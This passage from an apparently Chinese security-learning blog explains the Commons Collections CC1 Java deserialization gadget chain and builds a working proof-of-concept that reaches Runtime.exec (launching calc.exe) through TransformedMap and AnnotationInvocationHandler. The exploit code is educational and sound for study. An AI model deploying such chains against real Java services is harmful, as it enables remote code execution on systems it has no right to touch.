class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,valueTransformer)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/666309a5b73e4.png" alt="image-20240527200049786"></p><p><code>TransformedMap.decorate</code> 方法是Apache Commons Collections库中的一个静态方法，用于创建一个装饰器（decorator）包装在现有的<code>Map</code>实例上。这个装饰器会在原始<code>Map</code>的基础上，对键（key）、值（value）或两者进行转换操作，而不需要修改原<code>Map</code>的实现 </p><p>当你调用<code>TransformedMap.decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)</code>方法时，它会返回一个新的<code>Map</code>实例，该实例的每次put、get以及其他操作都会经过指定的转换器（Transformers）。</p><p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这里所说的”回调“，并不是传统意义上的⼀个回调函数，而是⼀个<strong>实现了Transformer接⼝的类</strong>。</p><p>这里补充一下<strong>Map</strong>：</p><p>在Java中，<code>Map</code>是一个接口，它是集合框架的一部分，用于存储键值对（key-value pairs）的数据结构。<code>Map</code>不是一个简单的对象，而是一个接口，它定义了一系列操作键值对的方法。通过这些方法，你可以插入、访问、更新或删除键值对。每个键（key）在<code>Map</code>中必须是唯一的，而同一个键可以关联一个值（value）。如果尝试用相同的键插入另一个值，这将会替换原有的值。</p><p><code>Map</code>接口的主要特点包括：</p><ul><li><strong>键值对</strong>: 它存储的数据形式为键值对，键（通常是唯一的）用于查找对应的值。</li><li><strong>键的唯一性</strong>: 一个<code>Map</code>中不能有重复的键，但值可以重复。</li><li><strong>无序</strong>: <code>Map</code>中的元素没有特定的顺序，尽管<code>LinkedHashMap</code>类可以保持插入顺序，<code>TreeMap</code>类则可以按键排序。</li><li><strong>常用操作</strong>: 包括<code>put(key, value)</code>添加键值对，<code>get(key)</code>根据键获取值，<code>containsKey(key)</code>检查键是否存在，<code>remove(key)</code>删除键值对等。</li></ul><p><code>Map</code>的常用实现类包括但不限于：</p><ul><li><code>HashMap</code>: 基于哈希表实现，无序，非线程安全，查询速度快。</li><li><code>TreeMap</code>: 基于红黑树实现，自然排序或自定义比较器排序，有序，线程不安全。</li><li><code>LinkedHashMap</code>: 有序（插入顺序或访问顺序），基于哈希表实现，非线程安全。</li><li><code>ConcurrentHashMap</code>: 线程安全的哈希表实现，支持高效并发访问。</li></ul><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><img src="https://bu.dusays.com/2024/06/07/666309a5a6524.png" alt="image-20240527153445294"></p><p>Transformer是⼀个接⼝，它只有⼀个待实现的方法:</p><p><img src="https://bu.dusays.com/2024/06/07/666309a59c55a.png" alt="image-20240527153520185"></p><p>因为这是class文件反编译出来的 所以是var1 不方便阅读 </p><p>其实就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个”回调 函数“，这个回调的参数是原始对象。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://bu.dusays.com/2024/06/07/666309a604c48.png" alt="image-20240527154019449"></p><p>源代码：</p><p><img src="https://bu.dusays.com/2024/06/07/666309a61abb6.png" alt="image-20240527154102328"></p><p>其实就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConstantTransformer是<strong>实现了Transformer接⼝</strong>的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform方法将这个对象再返回</p><p><strong>所以他的作用其实就是包装任意⼀个对象，在执行回调时返回这个对象，进而方便后续操作。</strong></p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><img src="https://bu.dusays.com/2024/06/07/666309a5b1338.png" alt="image-20240527190629018"></p><p>InvokerTransformer是<strong>同样实现了Transformer接⼝的⼀个类</strong>，这个类可以⽤来<strong>执行任意⽅法</strong>，这也是<strong>反序列化能执行任意代码的关键</strong></p><p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的<strong>⽅法名</strong>，第⼆个参数 是这个函数的参数列表的<strong>参数类型</strong>，第三个参数是传给这个函数的<strong>参数列表</strong>：</p><p><img src="https://bu.dusays.com/2024/06/07/666309a5d3a45.png" alt="image-20240527191132684"></p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[]</span></span><br><span class="line"><span class="params">args)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iMethodName = methodName;</span><br><span class="line"> iParamTypes = paramTypes;</span><br><span class="line"> iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后⾯的回调transform方法，就是执⾏了input对象的iMethodName⽅法</p><p><img src="https://bu.dusays.com/2024/06/07/666309a63811a.png" alt="image-20240527192724718"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="type">InvocationTargetException</span> <span class="variable">ex</span> <span class="operator">=</span> var6;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://bu.dusays.com/2024/06/07/666309a59bcb2.png" alt="image-20240527193048259"></p><p>ChainedTransformer<strong>也是实现了Transformer接口的⼀个类</strong>，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，<strong>前⼀个回调返回的结果，作为后⼀个回调的参数传入</strong>，我们画⼀个图做示意：</p><p><img src="https://bu.dusays.com/2024/06/07/666309a6aa74a.png" alt="image-20240527193315705"></p><p><img src="https://bu.dusays.com/2024/06/07/666309a60096c.png" alt="image-20240527193344213"></p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先看着两端代码吧</p><p><img src="https://bu.dusays.com/2024/06/07/666309a5bcaee.png" alt="image-20240527193846923"></p><p>创建了⼀个<code>ChainedTransformer</code>，其中包含两个Transformer：第⼀个是<code>ConstantTransformer</code>， 直接返回当前环境的<strong>Runtime对象</strong>；第⼆个是<code>InvokerTransformer</code>，执行<strong>Runtime对象的exec方法</strong>，参数是计算器的绝对地址</p><p>但是这个transformerChain只是⼀系列回调，我们需要用其来包装<code>innerMap</code>，使⽤的前⾯说到的 <code>TransformedMap.decorate</code> </p><p><img src="https://bu.dusays.com/2024/06/07/666309a59c97a.png" alt="image-20240527195511835"></p><p>在这个装饰过程中，键（key）的转换器被设置为<code>null</code>，意味着不会对键进行任何转换；而值（value）的转换则通过<code>transformerChain</code>指定的转换器链来进行。</p><p>最后，怎么触发回调呢？就是向Map中放入一个新的元素：</p><p><img src="https://bu.dusays.com/2024/06/07/666309a59d868.png" alt="image-20240527195618903"></p><p>当执行<code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;)</code>时，实际上是在向基础的<code>innerMap</code>中插入一对键值对，键为<code>&quot;test&quot;</code>，值为<code>&quot;xxxx&quot;</code>。</p><p>在实际反序列化漏洞中，我们需要将上面最终生成的outerMap对象变成一个序列化流</p><h2 id="CC1链"><a href="#CC1链" class="headerlink" title="CC1链"></a>CC1链</h2><p>链子写法很多 但是原理都是那样</p><p>主要原理就两种</p><p>LazyMap与TransformedMap</p><p>LazyMap来自ysoserial</p><p>而TransformedMap来自Code White的Slide与长亭科技的博客文章</p><p>我们先来看TransformedMap链</p><h3 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h3><h4 id="分析构造链子"><a href="#分析构造链子" class="headerlink" title="分析构造链子"></a>分析构造链子</h4><p>根据我们前面写的demo</p><p>我们已经知道触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素</p><p>在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个类，它在反序列化的<code>readObject</code>逻辑里有类似的写入操作。</p><p>要可序列化必须重写<code>readObject()</code>方法，接受任意对象作为参数</p><p>这个类就是 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，我们查看它的<code>readObject</code> 方法</p><p><img src="https://bu.dusays.com/2024/06/07/666309a80d9f6.png" alt="image-20240528003422203"></p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>它的核心代码就是 <code>Map.Entry memberValue : memberValues.entrySet() 和memberValue.setValue(...)</code> 。</p><p><img src="https://bu.dusays.com/2024/06/07/666309a63c4ce.png" alt="image-20240528003852260"></p><p><code>memberValues</code>就是反序列化后得到的Map，也是<strong>经过了TransformedMap修饰的对象</strong>，这里遍历了它 的所有元素，并依次设置值。<strong>在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们为其精心设计的任意代码</strong>。</p><p>所以，我们构造POC的时候，就需要创建一个<code>AnnotationInvocationHandler</code>对象，并将前面构造的 HashMap设置进来</p><p>因为 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 是在JDK内部的类，不能直接使 用new来实例化。我们使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化 了。</p><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是参数就是前面构造的Map</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>和URLDNS链一样，<strong>起点</strong>是某个类的<code>readObject()</code>方法</p><p>这里就是<code>AnnotationInvocationHandler</code>的<code>readObject()</code></p><p>然后我们通过如下代码将这个对象生成序列化流</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure><ul><li>创建<code>ByteArrayOutputStream</code>和<code>ObjectOutputStream</code>，将反射创建的<code>AnnotationInvocationHandler</code>实例（<code>obj</code>）序列化到字节数组中。</li><li>打印序列化后的字节数组内容到控制台。</li><li>利用<code>ObjectInputStream</code>从刚序列化的字节数组中反序列化出对象，并将其类型强制转换为<code>Object</code>。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(barr);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br></pre></td></tr></table></figure><p>再加上这段代码 <strong>反序列化</strong></p><p>这样整个代码段完成了对象的序列化与反序列化的完整流程</p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line">  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);  </span><br><span class="line">oos.writeObject(obj); </span><br><span class="line">oos.close();  </span><br><span class="line"></span><br><span class="line">System.out.println(barr); </span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));  </span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure><p>一起分析一下：</p><ol><li><strong>反射创建对象</strong>:<ul><li>使用<code>Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)</code>获取<code>AnnotationInvocationHandler</code>类的<code>Class</code>对象。</li><li>通过<code>getDeclaredConstructor(Class.class, Map.class)</code>找到该类的一个构造函数，该构造函数接受一个<code>Class</code>对象和一个<code>Map</code>作为参数。由于构造函数可能是私有的，所以需要后续步骤来访问它。</li><li>调用<code>setAccessible(true)</code>方法，允许访问这个私有的构造函数。</li><li>利用反射创建<code>AnnotationInvocationHandler</code>实例，传入<code>Retention.class</code>作为注解类型和自定义的<code>Map</code>(<code>outerMap</code>)作为参数，最终创建并初始化了一个<code>AnnotationInvocationHandler</code>对象，并将其赋值给<code>obj</code>变量。</li></ul></li><li><strong>序列化对象</strong>:<ul><li>创建<code>ByteArrayOutputStream</code>和<code>ObjectOutputStream</code>，用于将对象序列化为字节数组。</li><li>使用<code>oos.writeObject(handler)</code>将<code>InvocationHandler</code>实例序列化到字节数组中。</li><li>关闭<code>ObjectOutputStream</code>以确保所有数据被写入。</li><li>打印序列化后的<code>ByteArrayOutputStream</code>对象的默认字符串表示（注意，直接打印<code>ByteArrayOutputStream</code>对象可能并不直观展示字节内容）。</li></ul></li><li><strong>反序列化对象</strong>:<ul><li>创建<code>ObjectInputStream</code>，其构造函数接收之前序列化数据的<code>ByteArrayInputStream</code>。</li><li>使用<code>ois.readObject()</code>从字节流中反序列化出原始的<code>InvocationHandler</code>对象，并将其赋值给一个泛型为<code>Object</code>的变量<code>o</code>。</li></ul></li></ol><p>将这几段代码拼接到demo代码的后面，组成一个完整的POC。运行这个POC，看看能否生成序列化数据流：</p><p>注意 这里加点代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(barr);</span><br></pre></td></tr></table></figure><p>前面的demo也稍微动了一下 来满足我们后面写的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">innerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>还加入了一些包</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;) <span class="comment">// Windows下的计算器命令，根据实际情况调整</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        innerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/666309a6b3d0b.png" alt="image-20240528151056291"></p><p>运行报错了</p><p><img src="https://bu.dusays.com/2024/06/07/666309a7cac73.png" alt="image-20240528152101752"></p><blockquote><p>Exception in thread “main” java.io.NotSerializableException: java.lang.Runtime</p></blockquote><p>在writeObject的时候出现异常了： java.io.NotSerializableException: java.lang.Runtime 。</p><p>原因:</p><p><strong>Java中不是所有对象都支持序列化</strong>，待序列化的对象和所有它使用的内部属性对象，必须都实现<code>java.io.Serializable</code>接口。而我们最早传给ConstantTransformer的是 <code>Runtime.getRuntime()</code> ，<strong>Runtime类是没有实现</strong> <code>java.io.Serializable</code> 接口的，所以不允许被序列化。</p><p>解决：</p><p>我们可以通过<strong>反射</strong>来获取到当前上下文中的Runtime对象，而不需要直接使用这个类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>这也是为什么需要使用反射的原因</p><p>所以修改我们的代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span> &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>和我们之前写的代码最大的区别就是将 <code>Runtime.getRuntime()</code> 换成了 <code>Runtime.class</code> ，前者是一个 <code>java.lang.Runtime</code> 对象，后者是一个 <code>java.lang.Class</code> 对象。<strong>Class类有实现Serializable接口</strong>，所以可以被序列化</p><p>好 我们用这个代码再运行一下</p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span 